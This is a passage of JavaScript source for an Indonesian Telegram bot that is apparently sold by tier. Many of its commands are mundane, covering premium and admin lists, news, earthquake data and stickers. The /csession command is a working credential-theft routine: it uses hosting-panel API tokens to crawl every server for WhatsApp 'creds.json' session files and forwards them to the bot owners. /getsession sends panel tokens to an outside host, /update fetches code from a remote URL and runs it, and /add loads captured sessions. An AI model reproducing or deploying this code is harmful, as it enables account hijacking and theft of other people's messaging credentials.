  // Pastikan hanya creator yang bisa menjalankan perintah ini
  if (!isCreator) {
    bot.sendMessage(chatId, 'Perintah ini hanya dapat dijalankan oleh owner bot.');
    return;
  }

  // Pastikan semua parameter ada
  if (!text || !harga || !payment) {
    bot.sendMessage(chatId, 'Contoh penggunaan yang benar: /done produk|harga|metode pembayaran');
    return;
  }

  // Kirim pesan ketika transaksi selesai
  const msgToSend = {
    text: `𝗔𝗹𝗹𝗵𝗮𝗺𝗱𝘂𝗹𝗶𝗹𝗮𝗵 𝗧𝗿𝘅 𝗗𝗼𝗻𝗲 ✅\n\n• 𝗣𝗿𝗼𝗱𝘂𝗸 : ${text}\n• 𝗛𝗮𝗿𝗴𝗮 : ${harga}\n• 𝗣𝗲𝗺𝗯𝗮𝘆𝗮𝗿𝗮𝗻 : ${payment}\n*_`
  };

  bot.sendMessage(chatId, msgToSend.text, { parse_mode: 'Markdown' });
});      
       
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);

     bot.sendMessage(chatId, response); });

const moment = require('moment');
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
「 ⓘ Fitur Ini Khusus Owner Bg 」.`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
✅ anak kacung, sekarang ${userId} Memiliki aksess premium.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });

bot.onText(/\/cekprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
「 ⓘ Fitur Ini Khusus Owner Bg 」.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/update/, async (msg) => {

    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/ridoarizzzz/update-andz/refs/heads/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {

        const { data } = await axios.get(repoRaw);

        if (!data || data.length < 10) {

            return bot.sendMessage(
                chatId,
                "❌ Update gagal: file kosong"
            );

        }

        fs.writeFileSync("./index.js", data);

        await bot.sendMessage(
            chatId,
            "✅ Update berhasil!\n♻️ Bot sedang restart..."
        );

        // restart pm2 otomatis
        process.exit(1);

    } catch (e) {

        console.log(e);

        bot.sendMessage(
            chatId,
            "❌ Update gagal"
        );

    }

});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
「 ⓘ Fitur Ini Khusus Owner Bg 」.`);

        { parse_mode: "Markdown" }
   
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅ anak kacung, sekarang ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
「 ⓘ Fitur Ini Khusus Owner Bg 」.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus kacung ${userId} dari daftar premium. `);
         });

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
「 ⓘ Fitur Ini Khusus Owner Bg 」.`,

        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });

bot.onText(/\/lapor (.+)/, (msg, match) => {
  let laporan = match[1];
  let teks = `───「 LAPORAN BERHASIL 」────
Laporan Anda telah diterima oleh admin @nanzlyora

Detail Laporan:
- Pengirim : [@${msg.from.username}]                        
- Pesan : ${laporan}

Terima kasih atas laporannya!`//user?id=${msg.from.id})

  bot.sendMessage(msg.chat.id, teks, {
    parse_mode: 'Markdown',
  });

  // Kirim laporan ke admin
  bot.sendMessage(global.adminId, `Laporan dari [@${msg.from.username}](tg://user?id=${msg.from.id}): ${laporan}`, {
    parse_mode: 'Markdown',
  });
});
bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©Fadlan News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});
bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text || !text.trim()) {
        return bot.sendMessage(chatId, "Contoh:\n/ssweb google.com");
    }

    try {
        bot.sendChatAction(chatId, "upload_photo").catch(() => {});

        let cleanUrl = text.replace(/^https?:\/\//, "").trim();
        let finalUrl = "https://" + cleanUrl;

        let ssImage = "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + finalUrl;

        await bot.sendPhoto(chatId, ssImage, {
            caption: "_berhasil ssweb_",
            parse_mode: "Markdown"
        });

    } catch (e) {
        console.log("SSWEB ERROR:", e);
        bot.sendMessage(chatId, "⚠️ Server SS Web sedang offline atau URL tidak valid.");
    }
}); 
bot.onText(/^\/add$/i, async (msg) => {
  const chatId = msg.chat.id
  if (!isOwner(msg)) return bot.sendMessage(chatId, '❌ Hanya owner.')

  const doc = msg.reply_to_message?.document
  if (!doc) return bot.sendMessage(chatId, '❌ Balas file session dengan `/add`')

  const name = doc.file_name.toLowerCase()
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return bot.sendMessage(chatId, '❌ File bukan session.')

  await bot.sendMessage(chatId, '🔄 Memproses session…')

 
  const url = await bot.getFileLink(doc.file_id)
  const { data } = await axios.get(url, { responseType: 'arraybuffer' })
  const buf = Buffer.from(data)
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), buf)
  } else if (name.endsWith('.zip')) {
    new AdmZip(buf).extractAllTo(tmp, true)
  } else {
    const tmpTar = path.join(tmp, name)
    await fs.writeFile(tmpTar, buf)
    await tar.x({ file: tmpTar, cwd: tmp })
  }

  
  const credsPath = await findCredsFile(tmp)
  if (!credsPath) return bot.sendMessage(chatId, '❌ creds.json tidak ditemukan')


  const creds     = await fs.readJson(credsPath)
  const botNumber = creds.me.id.split(':')[0]
  const destDir   = createSessionDir(botNumber)

  await fs.remove(destDir)
  await fs.copy(tmp, destDir)
  saveActiveSessions(botNumber)

  
  const auth = await useMultiFileAuthState(destDir)

  
  await connectToWhatsApp(botNumber, chatId, auth)

  return bot.sendMessage(chatId, `✅ Session ${botNumber} berhasil di-add dan online.`)
});
bot.onText(/^\/csession(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
「 ⓘ Fitur Ini Khusus Owner Bg 」`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "MY CREATOR💞", url: "https://t.me/nanzlyora" }]
        ]
      }
    });
  }
  const text = match[1];
  if (!text) return bot.sendMessage(chatId, '❌ Missing Input\nExample: `/csession domain,plta,pltc`', { parse_mode: 'Markdown' });

  const args = text.split(',');
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc) return bot.sendMessage(chatId, '❌ Parameter tidak lengkap. Gunakan format: `/csession domain,plta,pltc`', { parse_mode: 'Markdown' });

  await bot.sendMessage(chatId, '⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...', { parse_mode: 'Markdown' });

  // Helper: cek apakah item adalah direktori
  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return (
      a.type === 'dir' ||
      a.type === 'directory' ||
      a.mode === 'dir' ||
      a.mode === 'directory' ||
      a.mode === 'd' ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  // ~ Fungsi rekursif untuk mencari "sessions/creds.json"
  async function traverseAndFind(identifier, dir = '/') {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
      });

      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];

      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || '';
        const itemPath = (dir === '/' ? '' : dir) + '/' + name;
        const normalized = itemPath.replace(/\/+/g, '/');

        if (name.toLowerCase() === 'sessions' && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || '';
                const sfPath = (normalized === '/' ? '' : normalized) + '/' + sfName;
                if (sfName.toLowerCase() === 'creds.json') {
                  found.push({ path: sfPath.replace(/\/+/g, '/'), name: sfName });
                }
              }
            }
          } catch {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === '' ? '/' : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === 'creds.json') {
            found.push({ path: (dir === '/' ? '' : dir) + '/' + name, name });
          }
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  // Jalankan scan
  try {
    const res = await axios.get(`${domain.replace(/\/+$/, '')}/api/application/servers`, {
      headers: { Accept: 'application/json', Authorization: `Bearer ${plta}` },
    });

    const data = res.data;
    if (!data || !Array.isArray(data.data)) {
      return bot.sendMessage(chatId, '❌ Gagal ambil list server dari panel.');
    }

    let totalFound = 0;

    for (let srv of data.data) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || 'unknown';
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, '/');
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, '/').replace(/^\/?/, '/');

          await bot.sendMessage(chatId, `📁 Ditemukan creds.json di server ${name}\nPath: \`${filePath}\``, {
            parse_mode: 'Markdown',
          });

          try {
            // Ambil URL download file
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;

              // Download file creds.json
              const fileRes = await axios.get(url, { responseType: 'arraybuffer' });
              const buffer = Buffer.from(fileRes.data);

              // Kirim ke owner
              for (let oid of ownerIds) {
                try {
                  await bot.sendDocument(oid, buffer, {}, {
                    filename: `${name.replace(/\s+/g, '_')}_creds.json`,
                  });
                } catch (e) {
                  console.error(`Gagal kirim file creds.json ke owner ${oid}:`, e);
                }
              }
            } else {
              await bot.sendMessage(chatId, `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}.`);
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
            await bot.sendMessage(chatId, `❌ Error saat download file creds.json dari ${name}`);
          }
        }
      }
    }

    if (totalFound === 0) {
      await bot.sendMessage(chatId, '✅ Scan selesai. Tidak ditemukan creds.json di folder sessions pada server manapun.');
    } else {
      await bot.sendMessage(chatId, `✅ Scan selesai. Total file creds.json berhasil diunduh dan dikirim: ${totalFound}`);
    }
  } catch (err) {
    console.error('csessions Error:', err);
    await bot.sendMessage(chatId, '❌ Terjadi error saat scan.');
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-mute.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});
const FormData = require("form-data");

bot.onText(/^\/iqc$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Balas pesan orang untuk bikin quote.");
  }

  const reply = msg.reply_to_message;
  const text = reply.text || reply.caption;

  if (!text) {
    return bot.sendMessage(chatId, "❌ Pesan yang direply tidak ada teks.");
  }

  // Data user
  const name = reply.from.first_name || "Tanpa Nama";
  const username = reply.from.username || "anonymous";
  const ppUrl = `https://t.me/i/userpic/320/${username}.jpg`; // fallback pp
  const warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];

  // Payload ke API
  const payload = {
    type: "quote",
    format: "png",
    backgroundColor: warna[Math.floor(Math.random() * warna.length)],
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: reply.from.id,
          name,
          photo: { url: ppUrl }
        },
        text,
        replyMessage: {}
      }
    ]
  };

  try {
    // Request ke API quote
    const res = await axios.post("https://bot.lyo.su/quote/generate", payload, {
      headers: { "Content-Type": "application/json" }
    });

    const base64 = res.data.result.image; // hasil base64
    if (!base64) {
      return bot.sendMessage(chatId, "❌ API tidak mengembalikan gambar.");
    }

    const buffer = Buffer.from(base64, "base64");

    // Kirim sebagai stiker
    await bot.sendSticker(chatId, buffer);
  } catch (err) {
    console.error("❌ Error generate quote:", err.message);
    bot.sendMessage(chatId, "❌ Gagal bikin quote, coba lagi nanti.");
  }
});
bot.onText(/^\/xn(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link})`
    )).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});

bot.onText(/\/info/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "7824002985"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @RixzNotDev</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "OWNER", url: "https://t.me/nanzlyora" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.onText(/^\/delsesi$/, async (msg) => {
    const chatId = msg.chat.id;      
    try {
        const processingMsg = await bot.sendMessage(chatId, "<blockquote><b>Proses restart sesi....</b></blockquote>", { reply_to_message_id: msg.message_id, parse_mode: "HTML" });
        await initializeWhatsAppConnections();
        await bot.editMessageText("<blockquote><b>Sukses restart sesi</b></blockquote>", {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, error);
    }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const { data } = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
    });

    const tmpPath = path.join(process.cwd(), "Session.json");
    fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: "📦 Session file requested",
    });

    fs.unlinkSync(tmpPath); // hapus file setelah dikirim

  } catch (err) {
    console.error("GetSession Error:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  }
});



bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

bot.onText(/^\/listharga$/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, `
<blockquote>💰 <b>DAFTAR HARGA SCRIPT DEATH FLOWERS</b></blockquote>
Klik tombol di bawah untuk melihat harga lengkap script bot:
  `, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📄 Lihat Harga Script", callback_data: "lihat_harga" }]
      ]
    }
  });
});

// Handler tombol
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "lihat_harga") {
    bot.sendMessage(chatId, `
<blockquote>💬 <b>SCRIPT TELEGRAM BOT</b></blockquote>
<blockquote>LIST HARGA SCRIPT ANDZVENUZ V1</blockquote>
<blockquote>
💞HARGA SC ANDZVENUZ V1
🔴 ғᴜʟʟ ᴜᴘ : 5ᴋ
🔴 ʀᴇssʟᴇʀ sᴄ : 15ᴋ
🔴 ᴘᴀᴛɴᴇʀ : 30ᴋ
🔴 ᴍᴏᴅᴇʀᴀᴛᴏʀ : 40ᴋ
🔴 ᴄᴇᴘ : 50ᴋ
🔴 ᴏᴡɴᴇʀ : 70ᴋ
contack: @iselcungz</blockquote>
    `, { parse_mode: "HTML" });
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

bot.onText(/^\/sticker$/, (msg) => {
  bot.sendMessage(msg.chat.id, "🖼️ Kirim gambar yang mau dijadiin stiker!");
});

// Saat user kirim foto
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;
  const photo = msg.photo.pop(); // ambil resolusi tertinggi
  const fileId = photo.file_id;

  try {
    // Ambil file URL dari Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Unduh gambar sementara
    const res = await fetch(fileUrl);
    const buffer = await res.arrayBuffer();
    const tempPath = path.join("./", `temp_${chatId}.jpg`);
    fs.writeFileSync(tempPath, Buffer.from(buffer));

    // Kirim sebagai stiker
    await bot.sendSticker(chatId, fs.createReadStream(tempPath));

    // Hapus file sementara
    fs.unlinkSync(tempPath);
  } catch (err) {
    console.error("❌ Gagal buat stiker:", err);
    bot.sendMessage(chatId, "⚠️ Gagal buat stiker. Coba kirim ulang gambarnya.");
  }
});
bot.onText(/\/time/, (msg) => {
  const now = new Date();
  bot.sendMessage(msg.chat.id, `🕒 Waktu sekarang: ${now.toLocaleString()}`);
});

bot.onText(/^\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) return bot.sendMessage(chatId, "⚠️ Contoh: /play snowchild");

  try {
    const wait = await bot.sendMessage(chatId, "🎧 Nyari lagunya bre...");

    // Search Spotify
    const searchApi = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const res = await axios.get(searchApi);

    if (!res.data.success || !res.data.result?.length) {
      return bot.editMessageText("❌ Lagu tidak ditemukan bre!", {
        chat_id: chatId,
        message_id: wait.message_id,
      });
    }

    const top = res.data.result[0];

    // ambil mp3 dari spotify v2
    const dl = await axios.get(
      `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(top.url)}`
    );

    const mp3 = dl.data?.data?.mp3DownloadLink;
    if (!mp3) throw new Error("Gagal ambil link mp3 bre!");

    // download buffer
    const buffer = await axios
      .get(mp3, { responseType: "arraybuffer" })
      .then((r) => Buffer.from(r.data));

    await bot.sendAudio(chatId, buffer, {
      title: top.title || "Unknown",
      performer: top.artist || "Unknown",
    });

    bot.deleteMessage(chatId, wait.message_id).catch(() => {});

  } catch (e) {
    bot.sendMessage(chatId, "❌ Error: " + e.message);
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©nanzlyora
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/\/ceklokasi(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  try {
    if (msg.reply_to_message?.location) {
      // Balasan ke pesan lokasi
      const { latitude, longitude } = msg.reply_to_message.location;
      return await sendLokasiInfo(chatId, latitude, longitude);
    }

    if (!input) {
      return bot.sendMessage(chatId, '📍 Kirim perintah dengan lokasi, contoh:\n`/ceklokasi Jakarta`\n\nAtau balas pesan lokasi.', {
        parse_mode: 'Markdown'
      });
    }

    // Cari berdasarkan teks (misal: "Bandung")
    const geo = await axios.get('https://nominatim.openstreetmap.org/search', {
      params: {
        q: input,
        format: 'json',
        limit: 1
      },
      headers: {
        'User-Agent': 'TelegramBot'
      }
    });

    if (!geo.data.length) {
      return bot.sendMessage(chatId, '❌ Lokasi tidak ditemukan.');
    }

    const { lat, lon, display_name } = geo.data[0];
    await sendLokasiInfo(chatId, lat, lon, display_name);

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, '❌ Gagal memproses lokasi.');
  }
});

